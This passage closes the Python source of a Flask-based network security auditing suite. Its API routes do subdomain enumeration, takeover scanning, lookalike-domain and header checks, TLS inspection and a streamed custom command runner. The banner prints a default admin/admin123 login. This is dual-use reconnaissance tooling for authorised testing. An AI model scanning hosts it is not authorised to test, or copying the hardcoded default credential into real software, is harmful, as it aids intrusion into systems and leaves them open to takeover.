    return jsonify({"success":True,"kind":kind,"target":q,"result":_rdap_lookup(kind, q)})


@app.route("/api/recon/headers", methods=["POST"])
@login_required
def api_recon_headers():
    d = get_json_body()
    host = _safe_host(str(d.get("target","") or d.get("host","")))
    if not host:
        return jsonify({"success":False,"error":"target required"}),400
    g = _headers_grade(host)
    if g is None:
        return jsonify({"success":False,"error":"host not reachable over http/https"}),502
    audit("headers_grade", details=f"{host} grade={g['grade']}")
    return jsonify({"success":True,"result":g})


@app.route("/api/recon/takeover", methods=["POST"])
@login_required
def api_recon_takeover():
    d = get_json_body()
    host = _safe_host(str(d.get("target","")))
    if not host:
        return jsonify({"success":False,"error":"target required"}),400
    names = {host}
    for s in bb_list_subdomains(host, 200):
        names.add(s["subdomain"])
    for s in d.get("subdomains") or []:
        s2 = _safe_host(str(s))
        if s2:
            names.add(s2)
    res = _takeover_scan(sorted(names)[:150])
    audit("takeover_scan", details=f"{host} names={len(names)} hits={len(res)}")
    return jsonify({"success":True,"results":res,"checked":len(names)})


@app.route("/api/recon/lookalikes", methods=["POST"])
@login_required
def api_recon_lookalikes():
    d = get_json_body()
    host = _safe_host(str(d.get("target","")))
    if not host:
        return jsonify({"success":False,"error":"target required"}),400
    probe = bool(d.get("probe", True))
    res = _lookalike_radar(host, probe=probe)
    audit("lookalike_radar", details=f"{host} hits={len(res)}")
    return jsonify({"success":True,"results":res,"permutations_checked":len(_lookalike_variants(host))})


@app.route("/api/recon/snapshots")
@login_required
def api_snapshots():
    target = _safe_host(request.args.get("target","")) or None
    return jsonify(_snapshot_list(target, 40))


@app.route("/api/recon/snapshots/<int:sid>")
@login_required
def api_snapshot_get(sid):
    s = _snapshot_get(sid)
    if not s:
        return jsonify({"success":False,"error":"not found"}),404
    return jsonify({"success":True,"snapshot":s})


@app.route("/api/recon/snapshots/diff")
@login_required
def api_snapshot_diff():
    a = request.args.get("a", type=int)
    b = request.args.get("b", type=int)
    if not a or not b:
        return jsonify({"success":False,"error":"a and b snapshot ids required"}),400
    sa, sb = _snapshot_get(a), _snapshot_get(b)
    if not sa or not sb:
        return jsonify({"success":False,"error":"snapshot not found"}),404
    # oldest first
    if sa["id"] > sb["id"]:
        sa, sb = sb, sa
    diff = _diff_snapshots(sa["snapshot"], sb["snapshot"])
    return jsonify({"success":True,"a":{"id":sa["id"],"taken_at":sa["taken_at"],"dna":sa["dna"]},
                    "b":{"id":sb["id"],"taken_at":sb["taken_at"],"dna":sb["dna"]},"diff":diff})


@app.route("/api/recon/graph/<job_id>")
@login_required
def api_recon_graph(job_id):
    j = get_pro_job(job_id)
    if not j:
        return jsonify({"success":False,"error":"not found"}),404
    graph = (j.get("result") or {}).get("graph") or {}
    if not graph and j.get("result"):
        graph = _attack_graph(j["result"])
    return jsonify({"success":True,"graph":graph})


@app.route("/api/recon/report/<job_id>.html")
@login_required
def api_recon_report(job_id):
    j = get_pro_job(job_id)
    if not j:
        return jsonify({"success":False,"error":"not found"}),404
    audit("recon_report_download", details=f"{j.get('target')} job={job_id}")
    return Response(_render_recon_report(j), mimetype="text/html",
                    headers={"Content-Disposition": f"attachment; filename=recon_{_safe_host(j.get('target','report'))}.html"})


# ----- TLS -----
@app.route("/api/tls/check", methods=["POST"])
@login_required
def api_tls_check():
    d=get_json_body(); host=str(d.get("host","")).strip(); port=int(d.get("port",443))
    if not host: return jsonify({"success":False,"error":"host required"}),400
    c = grab_tls_cert(host, port)
    if c and "error" not in c:
        audit("tls_check", device_ip=host, details=f"port={port}")
        try:
            conn=get_db()
            conn.execute("INSERT INTO ssl_cert_log (timestamp,host,port,subject,issuer,not_before,not_after,is_self_signed,weak_cipher,days_until_expiry,san,serial,sig_algo) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
                         (datetime.now().isoformat(),host,port,c.get("subject",""),c.get("issuer",""),c.get("not_before",""),c.get("not_after",""),
                          1 if c.get("is_self_signed") else 0,str(c.get("weak_cipher")),c.get("days_until_expiry"),
                          json.dumps(c.get("san",[])),c.get("serial",""),c.get("sig_algo","")))
            conn.commit(); conn.close()
        except Exception: pass
    return jsonify({"success":True,"cert":c})


# ----- Bug Bounty -----
@app.route("/api/bb/targets", methods=["GET","POST"])
@login_required
def api_bb_targets():
    if request.method=="POST":
        d=get_json_body(); tgt=str(d.get("target","")).strip()
        if not tgt: return jsonify({"success":False,"error":"target required"}),400
        ok,m = bb_add_target(tgt, d.get("scope","*.{t}"), d.get("notes",""))
        return jsonify({"success":ok,"message":m})
    return jsonify(bb_list_targets())


@app.route("/api/bb/targets/<path:target>", methods=["DELETE"])
@login_required
def api_bb_target_del(target):
    ok,m = bb_delete_target(target); return jsonify({"success":ok,"message":m})


@app.route("/api/bb/targets/<path:target>/enumerate", methods=["POST"])
@login_required
def api_bb_enum(target):
    d=get_json_body(); sources = tuple(d.get("sources") or ("crtsh","wordlist","subfinder","assetfinder","amass"))
    job_id = bb_start_subdomain_enum(_safe_host(target), sources=sources)
    return jsonify({"success":True,"job_id":job_id})


@app.route("/api/bb/targets/<path:target>/probe", methods=["POST"])
@login_required
def api_bb_probe(target):
    job_id = bb_start_live_probe(_safe_host(target), concurrency=int(get_json_body().get("concurrency",25)))
    return jsonify({"success":True,"job_id":job_id})


@app.route("/api/bb/targets/<path:target>/subdomains")
@login_required
def api_bb_subs(target):
    return jsonify(bb_list_subdomains(_safe_host(target), int(request.args.get("limit",1000))))


@app.route("/api/bb/targets/<path:target>/hosts")
@login_required
def api_bb_hosts(target):
    return jsonify(bb_list_live_hosts(_safe_host(target), int(request.args.get("limit",1000))))


@app.route("/api/bb/jobs/<job_id>")
@login_required
def api_bb_job(job_id):
    j = bb_get_job(job_id)
    if not j: return jsonify({"success":False,"error":"not found"}),404
    return jsonify({"success":True,"job":j})


@app.route("/api/bb/jobs")
@login_required
def api_bb_jobs():
    return jsonify(bb_list_jobs(limit=100))


@app.route("/api/bb/run", methods=["POST"])
@login_required
def api_bb_run():
    """Run an allowlisted command against a target (streamed)."""
    d = get_json_body()
    target = _safe_host(str(d.get("target","")))
    cmd = d.get("cmd")
    if not isinstance(cmd, list) or not cmd:
        return jsonify({"success":False,"error":"cmd must be a list of argv"}),400
    if not target:
        return jsonify({"success":False,"error":"target required"}),400
    # Inject target if '{target}' placeholder present, else append
    cmd = [c.replace("{target}", target) if isinstance(c,str) else c for c in cmd]
    job_id = bb_start_custom_cmd(target, cmd)

    @stream_with_context
    def gen():
        # Stream live output from the shared log_tail via short polls
        seen = 0
        deadline = time.time() + 600
        while time.time() < deadline:
            time.sleep(0.5)
            with bb_lock:
                j = bb_jobs.get(job_id)
            if not j: break
            tail = j.get("log_tail","")
            if len(tail) > seen:
                yield tail[seen:]; seen = len(tail)
            if j.get("status") in ("done","failed"):
                tail = j.get("log_tail","")
                if len(tail) > seen: yield tail[seen:]
                yield f"\n[status: {j.get('status')}]\n"
                return
        yield "\n[timeout]\n"

    return Response(gen(), mimetype="text/plain; charset=utf-8",
                    headers={"X-Job-Id": job_id})


@app.route("/api/bb/jobs/<job_id>/log")
@login_required
def api_bb_job_log(job_id):
    j = bb_get_job(job_id)
    if not j: return jsonify({"success":False,"error":"not found"}),404
    return jsonify({"success":True,"log":j.get("log_tail",""),"status":j.get("status"),"error":j.get("error","")})


# ----- AI Brain -----
@app.route("/api/ai/status")
@login_required
def api_ai_status():
    llm_on = get_setting("llm_enabled","0")=="1"
    return jsonify({
        "offline": True,
        "llm_enabled": llm_on,
        "llm_base_url": get_setting("llm_base_url",""),
        "llm_model": get_setting("llm_model",""),
        "ollama_base_url": get_setting("ollama_base_url",""),
        "intents": sorted(BRAIN_KNOWLEDGE.keys()),
    })


@app.route("/api/ai/ask", methods=["POST"])
@login_required
def api_ai_ask():
    d=get_json_body(); q=str(d.get("q","") or d.get("question","")).strip()
    if not q: return jsonify({"success":False,"error":"question required"}),400
    ctx = str(d.get("context",""))
    # Always try offline first
    brain = ask_brain(q, ctx)
    llm_ans = None; llm_used = False
    if bool(d.get("use_llm", False)) or get_setting("llm_enabled","0")=="1":
        ok,ans = llm_chat(q, context=ctx if ctx else None)
        if ok:
            llm_ans = ans; llm_used = True
    ai_memory.append({"role":"user","content":q})
    while len(ai_memory) > AI_MEMORY_LIMIT: ai_memory.pop(0)
    return jsonify({"success":True,"brain":brain,"llm_used":llm_used,"llm_answer":llm_ans})


@app.route("/api/ai/memory", methods=["DELETE","GET"])
@login_required
def api_ai_memory():
    global ai_memory
    if request.method=="DELETE": ai_memory=[]; return jsonify({"success":True})
    return jsonify({"memory":ai_memory[-30:]})


# ----- Settings -----
@app.route("/api/settings", methods=["GET","POST"])
@login_required
def api_settings():
    if request.method=="GET":
        return jsonify(all_settings_masked())
    d=get_json_body()
    key = str(d.get("key","")); val = d.get("value",""); masked = d.get("masked")
    if not key or not re.match(r"^[a-zA-Z0-9_]{2,64}$", key):
        return jsonify({"success":False,"error":"bad key"}),400
    if masked is not None:
        set_setting(key, str(val), int(bool(masked)))
    else:
        set_setting(key, str(val))
    audit("setting_change", details=f"key={key}")
    return jsonify({"success":True})


# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    banner = r"""
+======================================================================+
|           NETWORK ANALYZER — SECURITY AUDITING SUITE                |
|                                                                      |
|   Dashboard: http://localhost:{port}                                  |
|   Default login:  admin / admin123  (set ADMIN_PASSWORD env!)        |
|   SCAPY={scapy}    WiFi={wifi}    Root={root}                          |
|                                                                      |
|   Use ONLY on networks you own / are authorized to test.            |
+======================================================================+
    """.format(
        port=APP_PORT,
        scapy=("OK ("+str(SCAPY_IMPORT_ERROR or "")+")") if not SCAPY_AVAILABLE else "OK",
        wifi="OK" if wifi_supported() else "limited (Linux required)",
        root=("yes" if (hasattr(os,"geteuid") and os.geteuid()==0) else "no (some features disabled)"),
    )
    print(banner)

    init_db()
    atexit.register(cleanup_network_actions)
    signal.signal(signal.SIGTERM, lambda *a: (cleanup_network_actions(), sys.exit(0)))

    threading.Thread(target=background_scanner, daemon=True).start()
    threading.Thread(target=parental_enforcer, daemon=True).start()

    try:
        app.run(host=APP_HOST, port=APP_PORT, debug=False, threaded=True, use_reloader=False)
    except KeyboardInterrupt:
        scanner_running = False
        print("\n[*] Shutting down...")
        cleanup_network_actions()
